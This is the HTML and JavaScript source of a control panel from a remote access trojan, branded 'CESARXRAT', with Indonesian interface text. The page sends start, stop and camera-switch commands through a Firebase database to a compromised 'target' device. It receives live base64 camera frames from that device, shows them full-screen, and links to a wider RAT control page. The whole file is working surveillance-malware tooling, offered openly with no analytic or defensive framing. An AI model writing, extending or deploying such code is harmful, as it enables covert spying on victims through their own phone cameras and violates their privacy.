<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Live Camera - CESARXRAT</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body {
            background: #000;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            width: 100%;
            height: 100%;
            overflow: hidden;
            user-select: none;
            -webkit-user-select: none;
        }

        /* ===== TOP BAR ===== */
        .top-bar {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            height: 56px;
            background: linear-gradient(180deg, rgba(0,0,0,0.85) 0%, rgba(0,0,0,0) 100%);
            display: flex;
            align-items: center;
            padding: 0 16px;
            z-index: 100;
        }
        .top-bar .back-btn {
            background: rgba(255,255,255,0.15);
            border: none;
            color: #fff;
            font-size: 20px;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: 0.2s;
        }
        .top-bar .back-btn:active {
            background: rgba(255,255,255,0.3);
        }
        .top-bar .title {
            flex: 1;
            text-align: center;
            font-size: 18px;
            font-weight: bold;
            color: #fff;
        }
        .top-bar .close-btn {
            background: rgba(255,255,255,0.15);
            border: none;
            color: #fff;
            font-size: 20px;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: 0.2s;
        }
        .top-bar .close-btn:active {
            background: rgba(255,255,255,0.3);
        }

        /* ===== LIVE BADGE ===== */
        .live-badge {
            position: fixed;
            top: 68px;
            left: 16px;
            background: rgba(0,0,0,0.6);
            color: #ff4444;
            font-size: 12px;
            font-weight: bold;
            padding: 4px 12px;
            border-radius: 50px;
            display: flex;
            align-items: center;
            gap: 6px;
            z-index: 100;
            letter-spacing: 1px;
        }
        .live-badge .dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #ff4444;
            animation: livePulse 1.2s infinite;
        }
        @keyframes livePulse {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.4; transform: scale(0.85); }
            100% { opacity: 1; transform: scale(1); }
        }

        /* ===== CAMERA VIEW ===== */
        .camera-view {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #000;
            z-index: 1;
        }
        .camera-view img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            display: block;
        }
        .camera-view .placeholder {
            text-align: center;
            color: #888;
            font-size: 16px;
            padding: 20px;
        }
        .camera-view .placeholder .icon {
            font-size: 64px;
            display: block;
            margin-bottom: 16px;
            opacity: 0.5;
        }

        /* ===== SWITCH CAMERA BUTTON ===== */
        .switch-camera-btn {
            position: fixed;
            top: 68px;
            right: 16px;
            width: 56px;
            height: 56px;
            border-radius: 50%;
            background: rgba(255,255,255,0.2);
            border: 2px solid rgba(255,255,255,0.4);
            color: #fff;
            font-size: 24px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 100;
            transition: 0.3s;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
        }
        .switch-camera-btn:active {
            transform: scale(0.92);
            background: rgba(74, 158, 255, 0.5);
            border-color: #4a9eff;
        }
        .switch-camera-btn:disabled {
            opacity: 0.3;
            cursor: not-allowed;
        }

        /* ===== LOADING OVERLAY ===== */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            z-index: 200;
        }
        .loading-overlay.active {
            display: flex;
        }
        .loading-overlay .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(74, 158, 255, 0.3);
            border-top: 4px solid #4a9eff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-bottom: 16px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-overlay .text {
            color: #4a9eff;
            font-size: 14px;
        }

        /* ===== STATUS OVERLAY ===== */
        .status-overlay {
            position: fixed;
            bottom: 24px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.7);
            color: #fff;
            padding: 8px 18px;
            border-radius: 50px;
            font-size: 12px;
            z-index: 100;
            display: flex;
            gap: 14px;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
        }
        .status-overlay .item {
            display: flex;
            align-items: center;
            gap: 4px;
        }
        .status-overlay .item .label {
            color: #888;
        }
        .status-overlay .item .value {
            color: #4ae0a0;
            font-weight: bold;
        }

        /* ===== FPS ===== */
        .fps-box {
            position: fixed;
            bottom: 24px;
            right: 16px;
            background: rgba(0,0,0,0.7);
            color: #4ae0a0;
            padding: 6px 12px;
            border-radius: 50px;
            font-size: 11px;
            font-weight: bold;
            z-index: 100;
            font-family: 'Courier New', monospace;
        }
    </style>
</head>
<body>

    <!-- CAMERA VIEW (fullscreen) -->
    <div class="camera-view" id="cameraView">
        <div class="placeholder">
            <span class="icon">📷</span>
            Menunggu koneksi kamera...
        </div>
    </div>

    <!-- TOP BAR -->
    <div class="top-bar">
        <button class="back-btn" onclick="history.back()">←</button>
        <div class="title">Live Camera</div>
        <button class="close-btn" onclick="closeLiveCamera()">✕</button>
    </div>

    <!-- LIVE BADGE -->
    <div class="live-badge" id="liveBadge" style="display:none;">
        <span class="dot"></span>
        <span>LIVE</span>
    </div>

    <!-- SWITCH CAMERA BUTTON -->
    <button class="switch-camera-btn" id="btnSwitch" onclick="switchCamera()" disabled>
        🔄
    </button>

    <!-- LOADING OVERLAY -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <div class="text">Menghubungkan ke kamera...</div>
    </div>

    <!-- STATUS OVERLAY -->
    <div class="status-overlay">
        <div class="item">
            <span class="label">Camera:</span>
            <span class="value" id="statusCamera">-</span>
        </div>
        <div class="item">
            <span class="label">Status:</span>
            <span class="value" id="statusState">Idle</span>
        </div>
    </div>

    <!-- FPS COUNTER -->
    <div class="fps-box" id="fpsBox">FPS: 0</div>

    <script type="module">
        import { db, ref, onValue, set } from './firebase-config.js';

        const urlParams = new URLSearchParams(window.location.search);
        const targetId = urlParams.get('target');

        if (!targetId) {
            alert('Target tidak ditemukan!');
            window.location.href = 'device-target.html';
        }

        const cameraView = document.getElementById('cameraView');
        const liveBadge = document.getElementById('liveBadge');
        const btnSwitch = document.getElementById('btnSwitch');
        const loadingOverlay = document.getElementById('loadingOverlay');
        const statusCamera = document.getElementById('statusCamera');
        const statusState = document.getElementById('statusState');
        const fpsBox = document.getElementById('fpsBox');

        let currentCamera = 'back';
        let frameCount = 0;
        let lastFpsTime = Date.now();
        let lastFrameTime = 0;
        let isStreaming = false;

        // ===== AUTO START STREAMING =====
        function startStreaming() {
            const camera = currentCamera === 'front' ? 'front' : 'back';
            const cmd = camera === 'front' ? 'START_FRONT' : 'START_BACK';
            set(ref(db, 'targets/' + targetId + '/live_camera/command'), cmd);
            console.log('[LiveCamera] Start streaming:', camera);
        }

        function stopStreaming() {
            set(ref(db, 'targets/' + targetId + '/live_camera/command'), 'STOP');
            console.log('[LiveCamera] Stop streaming');
        }

        // ===== AUTO START saat halaman dibuka =====
        loadingOverlay.classList.add('active');
        startStreaming();

        // ===== LISTEN STATUS =====
        onValue(ref(db, 'targets/' + targetId + '/live_camera/status'), (snap) => {
            const status = snap.val() || 'idle';
            statusState.textContent = status;

            if (status === 'streaming') {
                liveBadge.style.display = 'flex';
                loadingOverlay.classList.remove('active');
                btnSwitch.disabled = false;
                isStreaming = true;
            } else if (status === 'idle') {
                liveBadge.style.display = 'none';
                loadingOverlay.classList.add('active');
                btnSwitch.disabled = true;
                isStreaming = false;
            } else {
                liveBadge.style.display = 'none';
                loadingOverlay.classList.add('active');
                btnSwitch.disabled = true;
                isStreaming = false;
            }
        });

        // ===== LISTEN CAMERA FACING =====
        onValue(ref(db, 'targets/' + targetId + '/live_camera/camera'), (snap) => {
            const cam = snap.val() || 'back';
            currentCamera = cam;
            statusCamera.textContent = cam === 'front' ? 'Depan' : 'Belakang';
        });

        // ===== LISTEN FRAME =====
        onValue(ref(db, 'targets/' + targetId + '/live_camera/current_frame'), (snap) => {
            const base64 = snap.val();
            if (!base64 || base64.length < 100) return;

            // Update gambar
            cameraView.innerHTML = '<img src="data:image/jpeg;base64,' + base64 + '" alt="Live Camera">';

            lastFrameTime = Date.now();

            // Update FPS
            frameCount++;
            const now = Date.now();
            if (now - lastFpsTime >= 1000) {
                const fps = Math.round(frameCount * 1000 / (now - lastFpsTime));
                fpsBox.textContent = 'FPS: ' + fps;
                frameCount = 0;
                lastFpsTime = now;
            }
        });

        // ===== AUTO-STOP kalau frame tidak update =====
        setInterval(() => {
            if (!isStreaming) return;

            const now = Date.now();
            if (lastFrameTime > 0 && (now - lastFrameTime) > 8000) {
                // 8 detik tidak ada frame — stream mungkin mati
                liveBadge.style.display = 'none';
                loadingOverlay.classList.add('active');
                console.log('[LiveCamera] Frame timeout, restart stream...');
                startStreaming();
            }
        }, 5000);

        // ===== SWITCH CAMERA =====
        window.switchCamera = function() {
            const newCam = currentCamera === 'back' ? 'front' : 'back';
            currentCamera = newCam;

            console.log('[LiveCamera] Switch to:', newCam);

            // Update UI langsung
            statusCamera.textContent = newCam === 'front' ? 'Depan' : 'Belakang';
            liveBadge.style.display = 'none';
            loadingOverlay.classList.add('active');

            // Kirim command switch
            const cmd = newCam === 'front' ? 'START_FRONT' : 'START_BACK';
            set(ref(db, 'targets/' + targetId + '/live_camera/command'), cmd);
        };

        // ===== CLOSE LIVE CAMERA =====
        window.closeLiveCamera = function() {
            // Stop stream
            stopStreaming();

            // Kembali ke rat-control
            setTimeout(() => {
                window.location.href = 'rat-control.html?target=' + targetId;
            }, 300);
        };

        // ===== CLEANUP saat keluar =====
        window.addEventListener('beforeunload', () => {
            stopStreaming();
        });

        console.log('[CESARXRAT] Live Camera page loaded, target:', targetId);
    </script>
</body>
</html>
